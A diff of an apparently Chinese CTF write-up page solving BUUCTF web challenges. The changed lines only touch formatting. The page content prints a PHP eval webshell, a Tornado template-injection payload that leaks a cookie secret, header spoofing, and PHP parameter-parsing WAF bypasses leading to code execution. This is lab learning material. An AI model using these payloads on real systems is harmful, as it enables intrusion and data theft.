@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.81.0" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.88.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -319,16 +319,16 @@
 <p>题目给了信息：连shell 的密码</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;Syc&#34;</span><span class="p">]);</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;Syc&#34;</span><span class="p">]);</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>只要知道 shell 的文件名就能连上了，通过题目我们可以猜测  Knife.php 就是 shell 。用 工具Knife尝试连接：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -336,7 +336,7 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="c1"># 连接地址
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="c1"># 连接地址
 </span><span class="c1"></span><span class="nx">http</span><span class="o">://</span><span class="nx">acd59323</span><span class="o">-</span><span class="mi">080</span><span class="nx">b</span><span class="o">-</span><span class="mi">473</span><span class="nx">a</span><span class="o">-</span><span class="nx">bf98</span><span class="o">-</span><span class="nx">cfe92218df08</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/?</span><span class="nx">Knife</span><span class="o">.</span><span class="nx">php</span>
 
 <span class="c1">#使用 index.php 也能连上，一般网站都存在 index.php
@@ -374,28 +374,28 @@
 <p>打开网站：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">:</span><span class="mi">28985</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">:</span><span class="mi">28985</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>打开网页源代码查看，搜索 .php文件,找到：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">Secret</span><span class="o">.</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">Secret</span><span class="o">.</span><span class="nx">php</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>打开网页：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">:</span><span class="mi">28985</span><span class="o">/</span><span class="nx">Secret</span><span class="o">.</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">:</span><span class="mi">28985</span><span class="o">/</span><span class="nx">Secret</span><span class="o">.</span><span class="nx">php</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p><img src="/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B32/image-20210616220127405.png" alt="image-20210616220127405"></p>
@@ -407,7 +407,7 @@
 <p>修改 UA ：</p>
 <p><img src="/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B32/image-20210616232456417.png" alt="image-20210616232456417"></p>
 <p>提示：No!!! you can only read this locally!!! （说只能在本地访问，使用本地 127.0.0.1）</p>
-<pre><code>X-Forwarded-For:127.0.0.1
+<pre tabindex="0"><code>X-Forwarded-For:127.0.0.1
 </code></pre><p><img src="/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B32/image-20210616232851897.png" alt="image-20210616232851897"></p>
 <p>得到Flag：flag{28c01f6a-0979-45e2-beff-da7b980b9c76}</p>
 <h2 id="font-color0288d1护网杯-2018easy_tornadofont"><a href="#font-color0288d1护网杯-2018easy_tornadofont" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:font-color0288d1护网杯-2018easy_tornadofont" class="headings"><font color=#0288D1>【护网杯 2018】easy_tornado</font></a></h2>
@@ -420,23 +420,23 @@
 <p>在tornado模板中，存在一些可以访问的快速对象，例如</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="p">{{</span> <span class="nx">escape</span><span class="p">(</span><span class="nx">handler</span><span class="o">.</span><span class="nx">settings</span><span class="p">[</span><span class="nx">“cookie”</span><span class="p">])</span> <span class="p">}}</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">{{</span> <span class="nx">escape</span><span class="p">(</span><span class="nx">handler</span><span class="o">.</span><span class="nx">settings</span><span class="p">[</span><span class="nx">“cookie”</span><span class="p">])</span> <span class="p">}}</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>这两个{{}}和这个字典对象也许大家就看出来了，没错就是这个handler.settings对象</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">handler</span> <span class="nx">指向RequestHandler</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">handler</span> <span class="nx">指向RequestHandler</span>
 
 <span class="nx">而</span> <span class="nx">RequestHandler</span><span class="o">.</span><span class="nx">settings</span> <span class="nx">又指向</span> <span class="nx">self</span><span class="o">.</span><span class="nx">application</span><span class="o">.</span><span class="nx">settings</span>
 
@@ -448,7 +448,7 @@
 <p>查看题目给的三个文件：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -465,7 +465,7 @@
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="mi">3</span><span class="nx">d50506c</span><span class="o">-</span><span class="mi">4</span><span class="nx">a83</span><span class="o">-</span><span class="mi">495</span><span class="nx">b</span><span class="o">-</span><span class="mi">9562</span><span class="o">-</span><span class="mi">20</span><span class="nx">f45572ca14</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/</span><span class="nx">file</span><span class="o">?</span><span class="nx">filename</span><span class="o">=/</span><span class="nx">hints</span><span class="o">.</span><span class="nx">txt</span><span class="o">&amp;</span><span class="nx">filehash</span><span class="o">=</span><span class="nx">c1715ad6398e0eafff09f1110f3f4105</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="mi">3</span><span class="nx">d50506c</span><span class="o">-</span><span class="mi">4</span><span class="nx">a83</span><span class="o">-</span><span class="mi">495</span><span class="nx">b</span><span class="o">-</span><span class="mi">9562</span><span class="o">-</span><span class="mi">20</span><span class="nx">f45572ca14</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/</span><span class="nx">file</span><span class="o">?</span><span class="nx">filename</span><span class="o">=/</span><span class="nx">hints</span><span class="o">.</span><span class="nx">txt</span><span class="o">&amp;</span><span class="nx">filehash</span><span class="o">=</span><span class="nx">c1715ad6398e0eafff09f1110f3f4105</span>
 
 <span class="c1"># /hints.txt
 </span><span class="c1"># md5(cookie_secret+md5(filename))
@@ -485,10 +485,10 @@
 </div><p>可以知道 flag 在 /fllllllllllllag 文件中，执行的 url 应该为：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">filename</span><span class="o">=/</span><span class="nx">fllllllllllllag</span><span class="o">.</span><span class="nx">txt</span><span class="o">&amp;</span><span class="nx">filehash</span><span class="o">=</span><span class="nx">md5</span><span class="p">(</span><span class="nx">cookie_secret</span><span class="o">+</span><span class="nx">md5</span><span class="p">(</span><span class="nx">filename</span><span class="p">))</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">filename</span><span class="o">=/</span><span class="nx">fllllllllllllag</span><span class="o">.</span><span class="nx">txt</span><span class="o">&amp;</span><span class="nx">filehash</span><span class="o">=</span><span class="nx">md5</span><span class="p">(</span><span class="nx">cookie_secret</span><span class="o">+</span><span class="nx">md5</span><span class="p">(</span><span class="nx">filename</span><span class="p">))</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><ol>
@@ -496,44 +496,44 @@
 </ol>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="mi">3</span><span class="nx">d50506c</span><span class="o">-</span><span class="mi">4</span><span class="nx">a83</span><span class="o">-</span><span class="mi">495</span><span class="nx">b</span><span class="o">-</span><span class="mi">9562</span><span class="o">-</span><span class="mi">20</span><span class="nx">f45572ca14</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/</span><span class="nx">file</span><span class="o">?</span><span class="nx">filename</span><span class="o">=/</span><span class="nx">fllllllllllllag</span><span class="o">&amp;</span><span class="nx">filehash</span><span class="o">=</span><span class="mi">8</span><span class="nx">aae49dac0ef2db819f0d8367f36914a</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="mi">3</span><span class="nx">d50506c</span><span class="o">-</span><span class="mi">4</span><span class="nx">a83</span><span class="o">-</span><span class="mi">495</span><span class="nx">b</span><span class="o">-</span><span class="mi">9562</span><span class="o">-</span><span class="mi">20</span><span class="nx">f45572ca14</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/</span><span class="nx">file</span><span class="o">?</span><span class="nx">filename</span><span class="o">=/</span><span class="nx">fllllllllllllag</span><span class="o">&amp;</span><span class="nx">filehash</span><span class="o">=</span><span class="mi">8</span><span class="nx">aae49dac0ef2db819f0d8367f36914a</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>报错 Error</p>
 <p>url为：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="mi">3</span><span class="nx">d50506c</span><span class="o">-</span><span class="mi">4</span><span class="nx">a83</span><span class="o">-</span><span class="mi">495</span><span class="nx">b</span><span class="o">-</span><span class="mi">9562</span><span class="o">-</span><span class="mi">20</span><span class="nx">f45572ca14</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/</span><span class="nx">error</span><span class="o">?</span><span class="nx">msg</span><span class="o">=</span><span class="nx">Error</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="mi">3</span><span class="nx">d50506c</span><span class="o">-</span><span class="mi">4</span><span class="nx">a83</span><span class="o">-</span><span class="mi">495</span><span class="nx">b</span><span class="o">-</span><span class="mi">9562</span><span class="o">-</span><span class="mi">20</span><span class="nx">f45572ca14</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/</span><span class="nx">error</span><span class="o">?</span><span class="nx">msg</span><span class="o">=</span><span class="nx">Error</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p><strong>tornado render模板注入：</strong></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">msg</span><span class="o">=</span><span class="p">{{</span><span class="nx">handler</span><span class="o">.</span><span class="nx">settings</span><span class="p">}}</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">msg</span><span class="o">=</span><span class="p">{{</span><span class="nx">handler</span><span class="o">.</span><span class="nx">settings</span><span class="p">}}</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>拿到环境变量信息，包含cookie:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="p">{</span><span class="s1">&#39;autoreload&#39;</span><span class="p">:</span> <span class="bp">True</span><span class="p">,</span> <span class="s1">&#39;compiled_template_cache&#39;</span><span class="p">:</span> <span class="bp">False</span><span class="p">,</span> <span class="s1">&#39;cookie_secret&#39;</span><span class="p">:</span> <span class="s1">&#39;595023eb-cf6a-42da-9acf-1f7decd194da&#39;</span><span class="p">}</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="p">{</span><span class="s1">&#39;autoreload&#39;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span> <span class="s1">&#39;compiled_template_cache&#39;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s1">&#39;cookie_secret&#39;</span><span class="p">:</span> <span class="s1">&#39;595023eb-cf6a-42da-9acf-1f7decd194da&#39;</span><span class="p">}</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>获取filehash 值，md5(cookie_secret+md5(filename))：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -541,7 +541,7 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># 工具进行md5加密</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># 工具进行md5加密</span>
 <span class="n">md5</span><span class="p">(</span><span class="mi">595023</span><span class="n">eb</span><span class="o">-</span><span class="n">cf6a</span><span class="o">-</span><span class="mi">42</span><span class="n">da</span><span class="o">-</span><span class="mi">9</span><span class="n">acf</span><span class="o">-</span><span class="mi">1</span><span class="n">f7decd194da</span><span class="o">+</span><span class="n">md5</span><span class="p">(</span><span class="o">/</span><span class="n">fllllllllllllag</span><span class="p">))</span>
 <span class="o">=&gt;</span><span class="n">md5</span><span class="p">(</span><span class="mi">595023</span><span class="n">eb</span><span class="o">-</span><span class="n">cf6a</span><span class="o">-</span><span class="mi">42</span><span class="n">da</span><span class="o">-</span><span class="mi">9</span><span class="n">acf</span><span class="o">-</span><span class="mi">1</span><span class="n">f7decd194da3bf9f6cf685a6dd8defadabfb41a03a1</span><span class="p">)</span>
 <span class="o">=&gt;</span><span class="n">ff69782613513fab09a1b58a10c13419</span>
@@ -552,7 +552,7 @@
 </div><p>使用python3脚本执行：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -572,7 +572,7 @@
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># 由于MD5模块在python3中被移除，使用hashlib 模块进行md5操作</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># 由于MD5模块在python3中被移除，使用hashlib 模块进行md5操作</span>
 <span class="kn">import</span> <span class="nn">hashlib</span>
 
 <span class="c1"># 待加密信息</span>
@@ -585,11 +585,11 @@
 <span class="c1"># 若写法为hl.update(str)  报错为： Unicode-objects must be encoded before hashing</span>
 <span class="n">obj1</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">filename</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
 <span class="n">s1</span> <span class="o">=</span> <span class="n">obj1</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
-<span class="k">print</span><span class="p">(</span><span class="n">s1</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">s1</span><span class="p">)</span>
 
 <span class="n">cookie_secret</span> <span class="o">=</span> <span class="s1">&#39;595023eb-cf6a-42da-9acf-1f7decd194da&#39;</span>
 <span class="n">obj2</span><span class="o">.</span><span class="n">update</span><span class="p">((</span><span class="n">cookie_secret</span><span class="o">+</span><span class="n">s1</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
-<span class="k">print</span><span class="p">(</span><span class="n">obj2</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">obj2</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><h2 id="font-color0288d1roarctf-2019easy-calcfont"><a href="#font-color0288d1roarctf-2019easy-calcfont" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:font-color0288d1roarctf-2019easy-calcfont" class="headings"><font color=#0288D1>【RoarCTF 2019】Easy Calc</font></a></h2>
@@ -598,27 +598,27 @@
 <p><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener"><font color=#0288D1>利用PHP的字符串解析特性Bypass</font></a></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">我们知道PHP将查询字符串（在URL或正文中）转换为内部</span> <span class="nv">$_GET或的关联数组</span> <span class="nv">$_POST。例如：</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">我们知道PHP将查询字符串（在URL或正文中）转换为内部</span> <span class="nv">$_GET或的关联数组</span> <span class="nv">$_POST。例如：</span>
 <span class="o">/?</span><span class="nx">foo</span><span class="o">=</span><span class="nx">bar变成Array</span><span class="p">([</span><span class="nx">foo</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="s2">&#34;bar&#34;</span><span class="p">)</span><span class="nx">。值得注意的是，查询字符串在解析的过程中会将某些</span>
 <span class="nx">字符删除或用下划线代替。例如，</span><span class="o">/?%</span><span class="mi">20</span><span class="nx">news</span><span class="p">[</span><span class="nx">id</span><span class="o">%</span><span class="mo">00</span><span class="o">=</span><span class="mi">42</span> <span class="nx">会转换为</span> <span class="k">Array</span><span class="p">([</span><span class="nx">news_id</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mi">42</span><span class="p">)</span><span class="nx">。</span>
 <span class="nx">如果一个IDS</span><span class="o">/</span><span class="nx">IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就</span>
 <span class="nx">可以用以下语句绕过：</span>
 </code></pre></td></tr></table></div>
 </div>
-</div><pre><code>/news.php?%20news[id%00=42&quot;+AND+1=0--
+</div><pre tabindex="0"><code>/news.php?%20news[id%00=42&quot;+AND+1=0--
 </code></pre><div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">上述PHP语句的参数</span> <span class="o">%</span><span class="mi">20</span><span class="nx">news</span><span class="p">[</span><span class="nx">id</span><span class="o">%</span><span class="mo">00</span> <span class="nx">的值将存储到</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;news_id&#34;</span><span class="p">]</span><span class="nx">中。</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">上述PHP语句的参数</span> <span class="o">%</span><span class="mi">20</span><span class="nx">news</span><span class="p">[</span><span class="nx">id</span><span class="o">%</span><span class="mo">00</span> <span class="nx">的值将存储到</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;news_id&#34;</span><span class="p">]</span><span class="nx">中。</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
@@ -661,7 +661,7 @@
 <p>得到一份源码：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -678,7 +678,7 @@
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
     <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
@@ -698,25 +698,25 @@
 </div><p>通过源码我们可以发现过滤了大部分字符，num 的传入值为非数字就会报错，在 ?num 前面加入一个空格 ? num或写 ?%20num，这样 传入的 'num' 就变成了 ' num'，绕过WAF。</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="c1"># 绕过成功
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="c1"># 绕过成功
 </span><span class="c1"></span><span class="nx">http</span><span class="o">://</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">:</span><span class="mi">25448</span><span class="o">/</span><span class="nx">calc</span><span class="o">.</span><span class="nx">php</span><span class="o">?%</span><span class="mi">20</span><span class="nx">num</span><span class="o">=</span><span class="nx">phpinfo</span><span class="p">()</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>扫根目录下的所有文件，也就是 <strong>scandir(&quot;/&quot;)</strong> ,<strong>但是“/”被过滤了，所以我们用 chr(47) 绕过</strong>,<strong>发现flagg文件</strong></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
